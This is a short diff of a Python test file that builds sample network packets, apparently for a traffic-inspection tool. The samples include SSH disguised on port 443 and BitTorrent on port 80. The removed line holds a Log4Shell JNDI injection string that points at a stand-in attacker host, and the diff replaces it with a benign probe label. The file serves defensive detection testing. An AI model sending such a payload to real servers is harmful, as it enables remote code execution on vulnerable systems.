@@ -135,7 +135,7 @@ if __name__ == "__main__":
         NetworkPacket("10.10.1.50", 51300, "198.51.100.25", 443, b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1"),  # SSH disguised on port 443!
         NetworkPacket("10.10.1.75", 52100, "198.51.100.25", 443, b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1"),  # Dev permitted SSH
         NetworkPacket("10.10.1.99", 54000, "198.51.100.40", 80, b"\x13BitTorrent protocol\x00\x00\x00"),       # BitTorrent on port 80
-        NetworkPacket("10.10.1.50", 55000, "203.0.113.88", 443, b"GET /search?q=${jndi:ldap://attacker.com/a} HTTP/1.1") # Log4Shell
+        NetworkPacket("10.10.1.50", 55000, "203.0.113.88", 443, b"GET /search?q=sample_log4j_jndi_probe HTTP/1.1") # Diagnostic Log4Shell Test
     ]
 
     for p in test_packets:
